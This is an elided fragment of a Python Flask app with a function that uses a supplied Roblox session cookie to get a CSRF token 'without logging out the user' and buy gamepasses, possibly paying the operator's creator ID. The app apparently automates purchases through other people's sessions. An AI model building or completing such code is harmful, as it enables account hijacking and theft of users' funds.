...
def purchase_gamepass(cookie, user_id, gamepass_id, price):
    ...
    try:
        ...
        # First, get X-CSRF token WITHOUT logging out the user
        try:
            # Use a safer endpoint to get CSRF token that doesn't log out the user
            ...
            if not csrf_token:
                # Fallback: try with catalog endpoint
            ...
            if csrf_token:
                ...
                print(f"✅ CSRF token obtained for gamepass {gamepass_id}")
            else:
                print("❌ CSRF token not found in headers")
                return False, "CSRF token not available"
                
        except Exception as csrf_error:
            print(f"❌ CSRF token fetch failed: {str(csrf_error)}")
            return False, f"CSRF token error: {str(csrf_error)}"
        ...
        purchase_data = {
            ...
            'expectedPrice': price,
            'expectedSellerId': 1  # Use 1 for Roblox system, or your creator ID
        }
...
# ... (Keep all the other functions exactly the same: get_roblox_user_info, is_valid_cookie, and all routes)
...
@app.route('/test-purchase')
def test_purchase():
    """Test endpoint to check if purchase functions work"""
    try:
        return jsonify({
            'status': 'success',
            'message': 'Purchase functions are loaded correctly',
            'gamepass_config': GAMEPASS_CONFIG
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
